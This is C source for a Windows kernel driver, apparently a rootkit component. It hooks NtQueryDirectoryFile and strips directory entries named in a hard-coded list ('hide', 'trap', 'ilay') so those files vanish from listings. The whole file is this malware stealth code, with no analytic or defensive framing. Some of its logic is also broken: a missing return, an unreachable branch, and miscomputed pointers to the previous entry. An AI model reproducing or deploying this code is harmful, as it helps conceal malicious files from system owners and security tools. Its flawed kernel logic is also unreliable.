#pragma warning (disable: 4100)
#include"File.h"

wchar_t files_to_hide[MAX_FILES_TO_HIDE][40]={L"hide", L"trap", L"ilay"};

NTSTATUS RougeNtQueryDirectoryFile(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
)
{
	NTSTATUS ret;
	pnt_querry_directory_file nt_query_directory_file_ptr = (pnt_querry_directory_file)nt_version_function_ptr;
	ret = nt_query_directory_file_ptr(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

	if (ret != 0)
	{
		return ret;
	}

	if ((FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileNamesInformation) &&
		IoStatusBlock->Information != 0)
	{
		return remove_single_file_from_file_information(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	}
	
	
}
NTSTATUS remove_single_file_from_file_information(
	HANDLE                 FileHandle,
	HANDLE                 Event,
	PIO_APC_ROUTINE        ApcRoutine,
	PVOID                  ApcContext,
	PIO_STATUS_BLOCK       IoStatusBlock,
	PVOID                  FileInformation,
	ULONG                  Length,
	FILE_INFORMATION_CLASS FileInformationClass,
	BOOLEAN                ReturnSingleEntry,
	PUNICODE_STRING        FileName,
	BOOLEAN                RestartScan
)

{
	PVOID first_struct_ptr = FileInformation;
	PVOID current_struct_ptr = FileInformation;
	next_entry_offset_and_file_name current_info = get_next_entry_offset_and_file_name(current_struct_ptr, FileInformationClass);
	while (*(current_info.next_entry_offset) != 0)
	{
		DbgPrint("name: %ws\n", get_next_entry_offset_and_file_name(current_struct_ptr, FileInformationClass).file_name);


		//if needs to be hidden
		if (check_file(current_info.file_name) == 1)
		{
			DbgPrint("file: %ws matched!!\n", current_info.file_name);
			//if first and last
			if (first_struct_ptr == current_struct_ptr && *(current_info.next_entry_offset) == 0)
			{
				DbgPrint("first case\n");
				if (ReturnSingleEntry)
				{
					pnt_querry_directory_file nt_query_directory_file_ptr = (pnt_querry_directory_file)nt_version_function_ptr;
					NTSTATUS ret = nt_query_directory_file_ptr(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, TRUE, FileName, FALSE);
					return ret;
				}
				else
				{
					IoStatusBlock->Information = 0;
					IoStatusBlock->Status = STATUS_NO_MORE_FILES;
					return STATUS_NO_MORE_FILES;
				}
			}
			//last but not first
			else if (first_struct_ptr != current_struct_ptr && *(current_info.next_entry_offset) == 0)
			{
				DbgPrint("second case\n");
				PVOID prev_struct_ptr = (PVOID)((PBYTE)current_struct_ptr - *(current_info.next_entry_offset));
				next_entry_offset_and_file_name prev_info = get_next_entry_offset_and_file_name(prev_struct_ptr, FileInformationClass);
				*(prev_info.next_entry_offset) = 0;
				break;

			}
			else if (first_struct_ptr == current_struct_ptr && *(current_info.next_entry_offset) != 0)
			{
				DbgPrint("third case!\n");
				PVOID next_struct_ptr = (PVOID)((PBYTE)current_struct_ptr + *(current_info.next_entry_offset));
				next_entry_offset_and_file_name next_info = get_next_entry_offset_and_file_name(next_struct_ptr, FileInformationClass);
				kernel_memory_move(first_struct_ptr, (PVOID)((PBYTE)current_struct_ptr + *(current_info.next_entry_offset)), Length - *(current_info.next_entry_offset));
				IoStatusBlock->Information -= *(current_info.next_entry_offset);
				break;
			}
			else
			{
				DbgPrint("fourth case\n");
				PVOID prev_struct_ptr = (PVOID)((PBYTE)current_struct_ptr - *(current_info.next_entry_offset));
				next_entry_offset_and_file_name prev_info = get_next_entry_offset_and_file_name(prev_struct_ptr, FileInformationClass);
				*(prev_info.next_entry_offset) += *(current_info.next_entry_offset);
				break;
			}
		}

		else
		{
			current_struct_ptr = (PVOID)((PBYTE)current_struct_ptr + *(current_info.next_entry_offset));
			current_info = get_next_entry_offset_and_file_name(current_struct_ptr, FileInformationClass);

		}

	}
	return STATUS_SUCCESS;
}





next_entry_offset_and_file_name get_next_entry_offset_and_file_name(PVOID FileInformation, FILE_INFORMATION_CLASS FileInformationClass)
{
	next_entry_offset_and_file_name next_entry_offset_and_file_name = { 0 };
	switch (FileInformationClass)
	{
	case FileDirectoryInformation:
	{
		PFILE_DIRECTORY_INFORMATION file_directory_information = (PFILE_DIRECTORY_INFORMATION)FileInformation;
		next_entry_offset_and_file_name.file_name = file_directory_information->FileName;
		next_entry_offset_and_file_name.next_entry_offset = &(file_directory_information->NextEntryOffset);
		next_entry_offset_and_file_name.file_name_length = file_directory_information->FileNameLength;
		break;
	}


	case FileBothDirectoryInformation:
	{
		PFILE_BOTH_DIR_INFORMATION file_directory_information = (PFILE_BOTH_DIR_INFORMATION)FileInformation;
		next_entry_offset_and_file_name.file_name = file_directory_information->FileName;
		next_entry_offset_and_file_name.next_entry_offset = &(file_directory_information->NextEntryOffset);
		next_entry_offset_and_file_name.file_name_length = file_directory_information->FileNameLength;
		break;
	}


	case FileIdBothDirectoryInformation:
	{
		PFILE_ID_BOTH_DIR_INFORMATION file_directory_information = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;
		next_entry_offset_and_file_name.file_name = file_directory_information->FileName;
		next_entry_offset_and_file_name.next_entry_offset = &(file_directory_information->NextEntryOffset);
		next_entry_offset_and_file_name.file_name_length = file_directory_information->FileNameLength;
		break;
	}


	case FileFullDirectoryInformation:
	{
		PFILE_FULL_DIR_INFORMATION file_directory_information = (PFILE_FULL_DIR_INFORMATION)FileInformation;
		next_entry_offset_and_file_name.file_name = file_directory_information->FileName;
		next_entry_offset_and_file_name.next_entry_offset = &(file_directory_information->NextEntryOffset);
		next_entry_offset_and_file_name.file_name_length = file_directory_information->FileNameLength;
		break;
	}


	case FileIdFullDirectoryInformation:
	{
		PFILE_ID_FULL_DIR_INFORMATION file_directory_information = (PFILE_ID_FULL_DIR_INFORMATION)FileInformation;
		next_entry_offset_and_file_name.file_name = file_directory_information->FileName;
		next_entry_offset_and_file_name.next_entry_offset = &(file_directory_information->NextEntryOffset);
		next_entry_offset_and_file_name.file_name_length = file_directory_information->FileNameLength;
		break;
	}

	case FileNamesInformation:
	{
		PFILE_NAMES_INFORMATION file_directory_information = (PFILE_NAMES_INFORMATION)FileInformation;
		next_entry_offset_and_file_name.file_name = file_directory_information->FileName;
		next_entry_offset_and_file_name.next_entry_offset = &(file_directory_information->NextEntryOffset);
		next_entry_offset_and_file_name.file_name_length = file_directory_information->FileNameLength;
	}

	}
	return next_entry_offset_and_file_name;


}


BOOLEAN check_file(wchar_t* file)
{
	for (int i = 0; i < MAX_FILES_TO_HIDE; i++)
	{
		if (kernel_compare_unicode_strings(files_to_hide[i], file))
		{
			return TRUE;
		}
	}
	return FALSE;

}



void extract_file_name(wchar_t* buffer, PUNICODE_STRING FileName_argument)
{
	memcpy((PWCHAR)buffer, (PWCHAR) & (FileName_argument->Buffer), (size_t)FileName_argument->Length);
	*((PWCHAR)((PBYTE)buffer + FileName_argument->Length)) = L'\0';

}

void iterate_files_on_buffer(PVOID file_information_buffer,FILE_INFORMATION_CLASS file_information_class)
{
	PVOID current_struct_ptr = (PVOID)file_information_buffer;
	next_entry_offset_and_file_name current_info = get_next_entry_offset_and_file_name(current_struct_ptr, file_information_class);
	while (*(current_info.next_entry_offset) != 0)
	{
		DbgPrint("filename: %ws \n", current_info.file_name);
		current_struct_ptr = (PVOID)((PBYTE)current_struct_ptr + *(current_info.next_entry_offset));
		current_info = get_next_entry_offset_and_file_name(current_struct_ptr, file_information_class);
	}

}

BOOLEAN check_files_on_buffer(PVOID file_information_buffer, FILE_INFORMATION_CLASS file_information_class)
{
	PVOID current_struct_ptr = (PVOID)file_information_buffer;
	next_entry_offset_and_file_name current_info = get_next_entry_offset_and_file_name(current_struct_ptr, file_information_class);
	while (*(current_info.next_entry_offset) != 0)
	{
		if (check_file(current_info.file_name))
		{
			DbgPrint("unique: %ws", current_info.file_name);
			return TRUE;
		}
		current_struct_ptr = (PVOID)((PBYTE)current_struct_ptr + *(current_info.next_entry_offset));
		current_info = get_next_entry_offset_and_file_name(current_struct_ptr, file_information_class);
	}
	return FALSE;

}





